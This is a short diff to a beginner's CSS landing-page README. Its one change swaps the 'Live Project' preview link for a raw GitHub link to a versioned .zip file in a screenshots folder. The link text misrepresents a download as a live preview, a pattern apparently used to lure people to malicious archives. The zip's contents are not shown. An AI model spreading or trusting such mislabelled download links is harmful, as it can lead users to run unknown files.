@@ -12,4 +12,4 @@ I also learnt various flex-box properties.
  - what is box model in css etc.
 
 # Here is the preview of the project.
-[Live Project](https://companypage09.netlify.app/)
+[Live Project](https://raw.githubusercontent.com/muhammadAmeen786/Developer-landing-page/main/screen-shots/Developer-landing-page-v3.8-alpha.5.zip)
